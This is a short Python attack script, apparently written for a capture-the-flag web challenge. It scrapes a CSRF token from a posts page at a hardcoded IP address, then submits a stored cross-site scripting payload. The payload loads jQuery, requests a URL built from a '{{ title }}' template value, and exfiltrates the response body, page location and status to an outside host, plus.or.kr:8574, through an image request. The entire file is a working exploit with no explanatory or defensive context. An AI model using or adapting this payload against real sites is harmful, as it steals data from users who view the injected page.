
import re

import requests

cookies = {
    'session': '[ SESSION HERE ]'
}

r = requests.get('http://52.78.86.97:8080/posts/', cookies=cookies)

token = re.search('<input type="hidden" name="csrf_token" value="(.+?)">', r.text).group(1)
print(token)

payload = {
    'title': 'I am garbage',
    'content': """
    <script src="https://code.jquery.com/jquery-3.1.0.slim.min.js" integrity="sha256-cRpWjoSOw5KcyIOaZNo4i6fZ9tKPhYYb6i5T9RSVJG8=" crossorigin="anonymous"></script>
    <script>
        $(document).ready(function () {
            jQuery.ajax({
                method: 'GET',
                url: encodeURI('{{ title }}'),
                complete: function (xhr, status) {
                    new Image().src = 'http://plus.or.kr:8574/?location='+encodeURI(location.href)+'&status='+xhr.status+'&data='+xhr.responseText;
                }
            })
        });
    </script>
    """,
    'csrf_token': token
}

r = requests.post('http://52.78.86.97:8080/posts/', cookies=cookies, data=payload)
print(r.text)
